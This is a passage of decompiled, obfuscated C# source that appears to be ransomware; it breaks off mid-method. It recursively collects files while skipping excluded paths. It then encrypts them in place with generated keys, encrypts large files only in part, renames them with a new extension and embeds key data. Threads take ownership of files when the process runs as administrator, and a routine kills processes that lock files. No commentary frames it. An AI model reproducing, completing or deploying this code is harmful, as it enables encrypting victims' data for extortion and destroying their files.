using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using niXRooADroJ;

namespace wmzoZRdMaf;

internal sealed class IuKjJmfJcVBFA
{
	public sealed class uyJDsIgMSl
	{
		private static StringCollection IMMSvHAhoNNAG;

		private static List<string> FvEgybRPeBYa;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107405140));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107405135)) && !text.ToLower().Contains(getString_0(107405082)) && !text.ToLower().Contains(getString_0(107390595)) && !text.ToLower().Contains(getString_0(107390614)) && !text.ToLower().Contains(getString_0(107405101)) && !text.ToLower().Contains(getString_0(107390946)) && !text.ToLower().Contains(getString_0(107390919)) && !text.ToLower().Contains(getString_0(107390902)) && !text.ToLower().Contains(getString_0(107390853)) && !text.ToLower().Contains(getString_0(107390868)) && !text.ToLower().Contains(getString_0(107390322)) && !text.ToLower().Contains(getString_0(107390273)) && !text.ToLower().Contains(getString_0(107390288)) && !text.ToLower().Contains(getString_0(107390243)) && !text.ToLower().Contains(getString_0(107390254)) && !text.ToLower().Contains(getString_0(107390209)) && !text.ToLower().Contains(getString_0(107390228)) && !text.ToLower().Contains(getString_0(107390179)) && !text.ToLower().Contains(getString_0(107390194)) && !text.Contains(dOioDTBjWKE(getString_0(107390145))) && !text.Contains(getString_0(107390152)) && !text.Contains(getString_0(107390107)) && !text.EndsWith(getString_0(107394078)) && !text.EndsWith(getString_0(107395086)) && !text.EndsWith(getString_0(107390122)) && !text.EndsWith(getString_0(107395081)) && !text.EndsWith(getString_0(107390085)) && !text.ToLower().Contains(getString_0(107390080)) && !text.ToLower().Contains(GlAFQHcfgEJyh))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(ZnQTsnSydQf) * 1024.0 * 1024.0 && ZkQXlCKgLq == getString_0(107396938))
							{
								FvEgybRPeBYa.Add(text);
							}
							else if (File.Exists(text) && ZkQXlCKgLq == getString_0(107397195))
							{
								FvEgybRPeBYa.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return FvEgybRPeBYa;
		}

		static uyJDsIgMSl()
		{
			Strings.CreateGetStringDelegate(typeof(uyJDsIgMSl));
			IMMSvHAhoNNAG = new StringCollection();
			FvEgybRPeBYa = new List<string>();
		}
	}

	private sealed class SWZmPwJBhoj
	{
		public string AofojBvlIqaN;

		public bool _003CMain_003Eb__4(Process process_0)
		{
			return process_0.ProcessName == AofojBvlIqaN;
		}
	}

	private sealed class MIqpuJIkrjBMR
	{
		public string IKmcGKVfsAkoFI;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CMapDrv_003Eb__18(int int_0)
		{
			Thread.Sleep(uZwmuWmXUPb);
			SCtDlgPmJoxb.Add(getString_0(107390525) + IKmcGKVfsAkoFI + getString_0(107396799) + (char)int_0 + getString_0(107405055));
			try
			{
				if (COsiatrWvUa)
				{
					Console.WriteLine(getString_0(107390525) + IKmcGKVfsAkoFI + getString_0(107396799) + (char)int_0 + getString_0(107405055));
				}
			}
			catch
			{
			}
		}

		static MIqpuJIkrjBMR()
		{
			Strings.CreateGetStringDelegate(typeof(MIqpuJIkrjBMR));
		}
	}

	private sealed class qZvJdNwKrAHeP
	{
		private sealed class fAYnNuenDMnuFBv
		{
			public qZvJdNwKrAHeP KTVVpMilaQ;

			public string AVXbhEVgDtzcsv;

			public void _003CCrypt_003Eb__24()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					CBQRiXwqhEScXz(WindowsIdentity.GetCurrent().Name, AVXbhEVgDtzcsv);
				}
			}

			public void _003CCrypt_003Eb__25()
			{
				SgQPOQfDSyhRE(AVXbhEVgDtzcsv, KTVVpMilaQ.PvihqEsdNvpBrf, KTVVpMilaQ.EvSRjoDRbsbERQal, KTVVpMilaQ.VokRtgjrfwZGT, KTVVpMilaQ.togHzByXlVeVj);
			}
		}

		public string[] PvihqEsdNvpBrf;

		public string[] VokRtgjrfwZGT;

		public string togHzByXlVeVj;

		public string EvSRjoDRbsbERQal;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__23(string string_0)
		{
			fAYnNuenDMnuFBv CS_0024_003C_003E8__locals0 = new fAYnNuenDMnuFBv();
			CS_0024_003C_003E8__locals0.KTVVpMilaQ = this;
			CS_0024_003C_003E8__locals0.AVXbhEVgDtzcsv = string_0;
			if (vIHVrrLyyUkl && !XOkMXYHVKKZne().Contains(getString_0(107388396)) && !XOkMXYHVKKZne().Contains(getString_0(107405055)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						CBQRiXwqhEScXz(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.AVXbhEVgDtzcsv);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (XedFtYAsIv == getString_0(107396946))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					SgQPOQfDSyhRE(CS_0024_003C_003E8__locals0.AVXbhEVgDtzcsv, CS_0024_003C_003E8__locals0.KTVVpMilaQ.PvihqEsdNvpBrf, CS_0024_003C_003E8__locals0.KTVVpMilaQ.EvSRjoDRbsbERQal, CS_0024_003C_003E8__locals0.KTVVpMilaQ.VokRtgjrfwZGT, CS_0024_003C_003E8__locals0.KTVVpMilaQ.togHzByXlVeVj);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				SgQPOQfDSyhRE(CS_0024_003C_003E8__locals0.AVXbhEVgDtzcsv, PvihqEsdNvpBrf, EvSRjoDRbsbERQal, VokRtgjrfwZGT, togHzByXlVeVj);
			}
		}

		static qZvJdNwKrAHeP()
		{
			Strings.CreateGetStringDelegate(typeof(qZvJdNwKrAHeP));
		}
	}

	private sealed class AAfgHfRmqtNe
	{
		private sealed class TAoKAgEBIcUr
		{
			public AAfgHfRmqtNe BPGxpEKBxK;

			public string gXKnDbtqZVr;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in CCPXDRhgflzG)
				{
					if (gXKnDbtqZVr.ToLower().EndsWith(item + BPGxpEKBxK.HuMjnShEiYDem) && pvxdiQpIegI == getString_0(107396957))
					{
						if (Convert.ToInt32(WciFeGiWIPgj) * 1024 * 1024 > new FileInfo(gXKnDbtqZVr).Length)
						{
							try
							{
								OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(getString_0(107391575), getString_0(107391570), getString_0(107391589), gXKnDbtqZVr);
							}
							catch
							{
							}
						}
					}
					else if (gXKnDbtqZVr.ToLower().EndsWith(item) && pvxdiQpIegI == getString_0(107397214))
					{
						try
						{
							OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(getString_0(107391575), getString_0(107391570), getString_0(107391589), gXKnDbtqZVr);
						}
						catch
						{
						}
					}
				}
			}

			static TAoKAgEBIcUr()
			{
				Strings.CreateGetStringDelegate(typeof(TAoKAgEBIcUr));
			}
		}

		private sealed class BkBzGKaNvQht
		{
			public AAfgHfRmqtNe BPGxpEKBxK;

			public string SCkCsxQVoqw;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__33()
			{
				foreach (string item in CCPXDRhgflzG)
				{
					if (SCkCsxQVoqw.ToLower().EndsWith(item + BPGxpEKBxK.HuMjnShEiYDem) && pvxdiQpIegI == getString_0(107396960))
					{
						if (Convert.ToInt32(WciFeGiWIPgj) * 1024 * 1024 > new FileInfo(SCkCsxQVoqw).Length)
						{
							try
							{
								OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(getString_0(107391578), getString_0(107391573), getString_0(107391592), SCkCsxQVoqw);
							}
							catch
							{
							}
						}
					}
					else if (SCkCsxQVoqw.ToLower().EndsWith(item) && pvxdiQpIegI == getString_0(107397217))
					{
						try
						{
							OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(getString_0(107391578), getString_0(107391573), getString_0(107391592), SCkCsxQVoqw);
						}
						catch
						{
						}
					}
				}
			}

			static BkBzGKaNvQht()
			{
				Strings.CreateGetStringDelegate(typeof(BkBzGKaNvQht));
			}
		}

		public List<string> MLGPBiBMcj;

		public List<string> nvCiGIukQFkQKz;

		public string HuMjnShEiYDem;

		public string[] bNesffFghe;

		public string geYnJRldqTc;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__30(string string_0)
		{
			TAoKAgEBIcUr CS_0024_003C_003E8__locals0;
			foreach (string item in nvCiGIukQFkQKz)
			{
				if (bNesffFghe.Length != 0)
				{
					string[] array = bNesffFghe;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_09a3;
					}
				}
				try
				{
					if (item.EndsWith(HuMjnShEiYDem))
					{
						goto IL_09a3;
					}
				}
				catch (Exception)
				{
					goto IL_09a3;
				}
				if (!item.EndsWith(string_0) || eSzXPgKVtFvzPRkO.Contains(item))
				{
					continue;
				}
				if (eWnObXCrwa == getString_0(107396954))
				{
					try
					{
						if (YufxSSxUJJOSIn.VYJIPfkRIyod(item))
						{
							YufxSSxUJJOSIn.hNKWXHlxoAtPCiYq(item);
						}
					}
					catch
					{
					}
				}
				eSzXPgKVtFvzPRkO.Add(item);
				if (!MoDypcoPNXgE.Contains(Path.GetDirectoryName(item)))
				{
					MoDypcoPNXgE.Add(Path.GetDirectoryName(item));
				}
				WlGzlJNuBzaw(item);
				try
				{
					new ErRhqyAlKQbUV().MdtMYqjRlsPva(item);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (COsiatrWvUa)
							{
								Console.WriteLine(getString_0(107405082) + item + getString_0(107405005) + new FileInfo(item).Length + getString_0(107405016));
								Console.WriteLine(getString_0(107404975));
							}
						}
						catch
						{
						}
						OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107405414)), getString_0(107390556) + item + getString_0(107390556) + dOioDTBjWKE(getString_0(107405357)) + getString_0(107390556) + Environment.UserName + getString_0(107390556) + dOioDTBjWKE(getString_0(107405372)));
					}
				}
				catch (Exception ex2)
				{
					if (JkprrzFPchvjDH)
					{
						try
						{
							File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388058) + item + getString_0(107405347) + ex2.Message + getString_0(107396721));
						}
						catch (Exception)
						{
						}
					}
					continue;
				}
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex4)
					{
						if (JkprrzFPchvjDH)
						{
							try
							{
								File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388058) + item + getString_0(107405234) + ex4.Message + getString_0(107396721));
							}
							catch (Exception)
							{
							}
						}
						rYmLUpWPpFDd++;
						goto end_IL_02cd;
					}
					if (pxgfCwkrtMaZuuMB == getString_0(107396954) && new FileInfo(item).Length > Convert.ToInt32(reMazhEZDt) * 1024 * 1024 && !MLGPBiBMcj.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new TAoKAgEBIcUr();
						CS_0024_003C_003E8__locals0.BPGxpEKBxK = this;
						try
						{
							if (HuMjnShEiYDem != getString_0(107388318))
							{
								if (pkQDLnznjdsc)
								{
									HuMjnShEiYDem = UKBmvHPuuZLTSs + HuMjnShEiYDem;
								}
								File.Move(item, item + HuMjnShEiYDem);
							}
						}
						catch (Exception ex6)
						{
							if (JkprrzFPchvjDH)
							{
								try
								{
									File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388058) + item + getString_0(107404661) + ex6.Message + getString_0(107396721));
								}
								catch (Exception)
								{
								}
							}
							rYmLUpWPpFDd++;
							goto end_IL_02cd;
						}
						CS_0024_003C_003E8__locals0.gXKnDbtqZVr = getString_0(107391523);
						if (HuMjnShEiYDem != getString_0(107388318))
						{
							CS_0024_003C_003E8__locals0.gXKnDbtqZVr = item + HuMjnShEiYDem;
						}
						else
						{
							CS_0024_003C_003E8__locals0.gXKnDbtqZVr = item;
						}
						if (ZQgJcWfPvJPQ == getString_0(107396954))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in CCPXDRhgflzG)
								{
									if (CS_0024_003C_003E8__locals0.gXKnDbtqZVr.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.BPGxpEKBxK.HuMjnShEiYDem) && pvxdiQpIegI == TAoKAgEBIcUr.getString_0(107396957))
									{
										if (Convert.ToInt32(WciFeGiWIPgj) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.gXKnDbtqZVr).Length)
										{
											try
											{
												OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(TAoKAgEBIcUr.getString_0(107391575), TAoKAgEBIcUr.getString_0(107391570), TAoKAgEBIcUr.getString_0(107391589), CS_0024_003C_003E8__locals0.gXKnDbtqZVr);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.gXKnDbtqZVr.ToLower().EndsWith(item2) && pvxdiQpIegI == TAoKAgEBIcUr.getString_0(107397214))
									{
										try
										{
											OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(TAoKAgEBIcUr.getString_0(107391575), TAoKAgEBIcUr.getString_0(107391570), TAoKAgEBIcUr.getString_0(107391589), CS_0024_003C_003E8__locals0.gXKnDbtqZVr);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = mPZHeAmBXOW.NknwnSRhtiQplA(32);
						string text2 = getString_0(107391523);
						text2 = (intMyWSRTiS ? mPZHeAmBXOW.IDARSyoZrvbC() : getString_0(107391523));
						string s = GzxfJecXtrCbXb.kbfqQxGdxRHX(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = JCghqZmaNmX.sRBPBEhfdE(CS_0024_003C_003E8__locals0.gXKnDbtqZVr, Convert.ToInt32(reMazhEZDt) * 1024 * 1024);
						if (!JCghqZmaNmX.EAuQzPgdvEdb(YfXnuFcJvJQ: (!nWlczaiPXm) ? (intMyWSRTiS ? JCghqZmaNmX.mmAjtCaUmxxI(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : JCghqZmaNmX.mmAjtCaUmxxI(byte_, Convert.FromBase64String(geYnJRldqTc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (intMyWSRTiS ? RIdkSiOBtCCfM.LbymaNjlWfqxKnw(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : RIdkSiOBtCCfM.LbymaNjlWfqxKnw(byte_, Convert.FromBase64String(geYnJRldqTc), Convert.FromBase64String(QcVyigtSkYPoO))), XrDEgIqvtimnb: CS_0024_003C_003E8__locals0.gXKnDbtqZVr, ihfgVyorCHJcqa: bytes))
						{
							try
							{
								File.Move(item + HuMjnShEiYDem, item);
							}
							catch (Exception)
							{
							}
							continue;
						}
						goto IL_09a3;
					}
					if (pkQDLnznjdsc)
					{
						HuMjnShEiYDem = UKBmvHPuuZLTSs + HuMjnShEiYDem;
					}
					string text3 = mPZHeAmBXOW.NknwnSRhtiQplA(32);
					string text4 = getString_0(107391523);
					text4 = (intMyWSRTiS ? mPZHeAmBXOW.IDARSyoZrvbC() : getString_0(107391523));
					string s2 = GzxfJecXtrCbXb.kbfqQxGdxRHX(text3 + text4);
					byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
					if (HuMjnShEiYDem != getString_0(107388318))
					{
						if (!gBBPJhiOSqWIX)
						{
							if (!intMyWSRTiS)
							{
								XhyOceWttqVUAc(item, item + HuMjnShEiYDem, ignBTzWcyfBJ);
							}
							else
							{
								XhyOceWttqVUAc(item, item + HuMjnShEiYDem, Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!intMyWSRTiS)
								{
									MCelMqaTtIYudae(item, item + HuMjnShEiYDem, ignBTzWcyfBJ, Convert.FromBase64String(QcVyigtSkYPoO));
								}
								else
								{
									MCelMqaTtIYudae(item, item + HuMjnShEiYDem, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
								}
							}
							catch (Exception ex9)
							{
								if (JkprrzFPchvjDH)
								{
									try
									{
										File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388058) + item + getString_0(107387760) + ex9.Message + getString_0(107396721));
									}
									catch (Exception)
									{
									}
								}
								rYmLUpWPpFDd++;
								try
								{
									File.Move(item + HuMjnShEiYDem, item);
								}
								catch (Exception)
								{
								}
								goto end_IL_02cd;
							}
						}
					}
					else if (!gBBPJhiOSqWIX)
					{
						if (!intMyWSRTiS)
						{
							XhyOceWttqVUAc(item, item + getString_0(107388313), ignBTzWcyfBJ);
						}
						else
						{
							XhyOceWttqVUAc(item, item + getString_0(107388313), Convert.FromBase64String(text3));
						}
					}
					else
					{
						try
						{
							if (!intMyWSRTiS)
							{
								MCelMqaTtIYudae(item, item, ignBTzWcyfBJ, Convert.FromBase64String(QcVyigtSkYPoO));
							}
							else
							{
								MCelMqaTtIYudae(item, item, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
							}
						}
						catch (Exception ex12)
						{
							if (JkprrzFPchvjDH)
							{
								try
								{
									File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388058) + item + getString_0(107387760) + ex12.Message + getString_0(107396721));
								}
								catch (Exception)
								{
								}
							}
							rYmLUpWPpFDd++;
							goto end_IL_02cd;
						}
					}
					if (intMyWSRTiS)
					{
						if (HuMjnShEiYDem != getString_0(107388318))
						{
							JrgWtVXefnyJtd(item + HuMjnShEiYDem, bytes2);
						}
						else
						{
							JrgWtVXefnyJtd(item, bytes2);
						}
					}
					goto IL_09a3;
					end_IL_02cd:;
				}
				catch (Exception)
				{
					goto IL_09a3;
				}
				continue;
				IL_09a3:
				nvCiGIukQFkQKz.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__32(string string_0)
		{
			BkBzGKaNvQht CS_0024_003C_003E8__locals0 = new BkBzGKaNvQht();
			CS_0024_003C_003E8__locals0.BPGxpEKBxK = this;
			CS_0024_003C_003E8__locals0.SCkCsxQVoqw = string_0;
			if (bNesffFghe.Length != 0)
			{
				string[] array = bNesffFghe;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.SCkCsxQVoqw.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0a6b;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.SCkCsxQVoqw.EndsWith(HuMjnShEiYDem))
				{
					goto IL_0a6b;
				}
			}
			catch (Exception)
			{
				goto IL_0a6b;
			}
			if (!eSzXPgKVtFvzPRkO.Contains(CS_0024_003C_003E8__locals0.SCkCsxQVoqw))
			{
				if (eWnObXCrwa == getString_0(107396954))
				{
					try
					{
						if (YufxSSxUJJOSIn.VYJIPfkRIyod(CS_0024_003C_003E8__locals0.SCkCsxQVoqw))
						{
							YufxSSxUJJOSIn.hNKWXHlxoAtPCiYq(CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
						}
					}
					catch
					{
					}
				}
				eSzXPgKVtFvzPRkO.Add(CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
				if (!MoDypcoPNXgE.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.SCkCsxQVoqw)))
				{
					MoDypcoPNXgE.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.SCkCsxQVoqw));
				}
				WlGzlJNuBzaw(CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
				try
				{
					new ErRhqyAlKQbUV().MdtMYqjRlsPva(CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
				}
				catch
				{
				}
				try
				{
					using FileStream fileStream = new FileStream(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, FileMode.Open, FileAccess.Write);
					if (!fileStream.CanWrite)
					{
						try
						{
							if (COsiatrWvUa)
							{
								Console.WriteLine(getString_0(107405082) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + getString_0(107405005) + new FileInfo(CS_0024_003C_003E8__locals0.SCkCsxQVoqw).Length + getString_0(107405016));
								Console.WriteLine(getString_0(107404975));
							}
						}
						catch
						{
						}
						OrQEYkCSRFdRrs(dOioDTBjWKE(getString_0(107405414)), getString_0(107390556) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + getString_0(107390556) + dOioDTBjWKE(getString_0(107405357)) + getString_0(107390556) + Environment.UserName + getString_0(107390556) + dOioDTBjWKE(getString_0(107405372)));
					}
				}
				catch (Exception ex2)
				{
					if (JkprrzFPchvjDH)
					{
						try
						{
							File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388058) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + getString_0(107405347) + ex2.Message + getString_0(107396721));
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					return;
				}
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.SCkCsxQVoqw).Length != 0L)
						{
							goto end_IL_031d;
						}
						goto end_IL_031d_2;
						end_IL_031d:;
					}
					catch (Exception ex4)
					{
						if (JkprrzFPchvjDH)
						{
							try
							{
								File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388058) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + getString_0(107405234) + ex4.Message + getString_0(107396721));
							}
							catch (Exception)
							{
							}
						}
						rYmLUpWPpFDd++;
						goto end_IL_031d_2;
					}
					if (pxgfCwkrtMaZuuMB == getString_0(107396954) && new FileInfo(CS_0024_003C_003E8__locals0.SCkCsxQVoqw).Length > Convert.ToInt32(reMazhEZDt) * 1024 * 1024)
					{
						try
						{
							if (HuMjnShEiYDem != getString_0(107388318))
							{
								if (pkQDLnznjdsc)
								{
									HuMjnShEiYDem = UKBmvHPuuZLTSs + HuMjnShEiYDem;
								}
								File.Move(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + HuMjnShEiYDem);
							}
						}
						catch (Exception ex6)
						{
							if (JkprrzFPchvjDH)
							{
								try
								{
									File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388058) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + getString_0(107404661) + ex6.Message + getString_0(107396721));
								}
								catch (Exception)
								{
								}
							}
							rYmLUpWPpFDd++;
							return;
						}
						if (HuMjnShEiYDem != getString_0(107388318))
						{
							CS_0024_003C_003E8__locals0.SCkCsxQVoqw += HuMjnShEiYDem;
						}
						if (ZQgJcWfPvJPQ == getString_0(107396954))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in CCPXDRhgflzG)
								{
									if (CS_0024_003C_003E8__locals0.SCkCsxQVoqw.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.BPGxpEKBxK.HuMjnShEiYDem) && pvxdiQpIegI == BkBzGKaNvQht.getString_0(107396960))
									{
										if (Convert.ToInt32(WciFeGiWIPgj) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.SCkCsxQVoqw).Length)
										{
											try
											{
												OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(BkBzGKaNvQht.getString_0(107391578), BkBzGKaNvQht.getString_0(107391573), BkBzGKaNvQht.getString_0(107391592), CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.SCkCsxQVoqw.ToLower().EndsWith(item) && pvxdiQpIegI == BkBzGKaNvQht.getString_0(107397217))
									{
										try
										{
											OTEZtdtAZBqJ.jhrZoqvdXpIRCMN(BkBzGKaNvQht.getString_0(107391578), BkBzGKaNvQht.getString_0(107391573), BkBzGKaNvQht.getString_0(107391592), CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = mPZHeAmBXOW.NknwnSRhtiQplA(32);
						string text2 = getString_0(107391523);
						text2 = (intMyWSRTiS ? mPZHeAmBXOW.IDARSyoZrvbC() : getString_0(107391523));
						string s = GzxfJecXtrCbXb.kbfqQxGdxRHX(text + text2);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = JCghqZmaNmX.sRBPBEhfdE(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, Convert.ToInt32(reMazhEZDt) * 1024 * 1024);
						if (!JCghqZmaNmX.EAuQzPgdvEdb(YfXnuFcJvJQ: (!nWlczaiPXm) ? (intMyWSRTiS ? JCghqZmaNmX.mmAjtCaUmxxI(byte_, Convert.FromBase64String(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : JCghqZmaNmX.mmAjtCaUmxxI(byte_, Convert.FromBase64String(geYnJRldqTc), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (intMyWSRTiS ? RIdkSiOBtCCfM.LbymaNjlWfqxKnw(byte_, Convert.FromBase64String(text), Convert.FromBase64String(text2)) : RIdkSiOBtCCfM.LbymaNjlWfqxKnw(byte_, Convert.FromBase64String(geYnJRldqTc), Convert.FromBase64String(QcVyigtSkYPoO))), XrDEgIqvtimnb: CS_0024_003C_003E8__locals0.SCkCsxQVoqw, ihfgVyorCHJcqa: bytes))
						{
							try
							{
								File.Move(CS_0024_003C_003E8__locals0.SCkCsxQVoqw + HuMjnShEiYDem, CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
					}
					else
					{
						if (pkQDLnznjdsc)
						{
							HuMjnShEiYDem = UKBmvHPuuZLTSs + HuMjnShEiYDem;
						}
						string text3 = mPZHeAmBXOW.NknwnSRhtiQplA(32);
						string text4 = getString_0(107391523);
						text4 = (intMyWSRTiS ? mPZHeAmBXOW.IDARSyoZrvbC() : getString_0(107391523));
						string s2 = GzxfJecXtrCbXb.kbfqQxGdxRHX(text3 + text4);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (HuMjnShEiYDem != getString_0(107388318))
						{
							if (!gBBPJhiOSqWIX)
							{
								if (!intMyWSRTiS)
								{
									XhyOceWttqVUAc(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + HuMjnShEiYDem, ignBTzWcyfBJ);
								}
								else
								{
									XhyOceWttqVUAc(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + HuMjnShEiYDem, Convert.FromBase64String(text3));
								}
							}
							else
							{
								try
								{
									if (!intMyWSRTiS)
									{
										MCelMqaTtIYudae(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + HuMjnShEiYDem, ignBTzWcyfBJ, Convert.FromBase64String(QcVyigtSkYPoO));
									}
									else
									{
										MCelMqaTtIYudae(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + HuMjnShEiYDem, Convert.FromBase64String(text3), Convert.FromBase64String(text4));
									}
								}
								catch (Exception ex9)
								{
									if (JkprrzFPchvjDH)
									{
										try
										{
											File.AppendAllText(AIOBtLgIwjoLs, getString_0(107388058) + CS_0024_003C_003E8__locals0.SCkCsxQVoqw + getString_0(107387760) + ex9.Message + getString_0(107396721));
										}
										catch (Exception)
										{
										}
									}
									rYmLUpWPpFDd++;
									try
									{
										File.Move(CS_0024_003C_003E8__locals0.SCkCsxQVoqw + HuMjnShEiYDem, CS_0024_003C_003E8__locals0.SCkCsxQVoqw);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
						}
						else if (!gBBPJhiOSqWIX)
						{
							if (!intMyWSRTiS)
							{
								XhyOceWttqVUAc(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + getString_0(107388313), ignBTzWcyfBJ);
							}
							else
							{
								XhyOceWttqVUAc(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw + getString_0(107388313), Convert.FromBase64String(text3));
							}
						}
						else
						{
							try
							{
								if (!intMyWSRTiS)
								{
									MCelMqaTtIYudae(CS_0024_003C_003E8__locals0.SCkCsxQVoqw, CS_0024_003C_003E8__locals0.SCkCsxQVoqw, ignBTzWcyfBJ, Convert.FromBase64String(QcVyigtSkYPoO));
								}
								else
								{
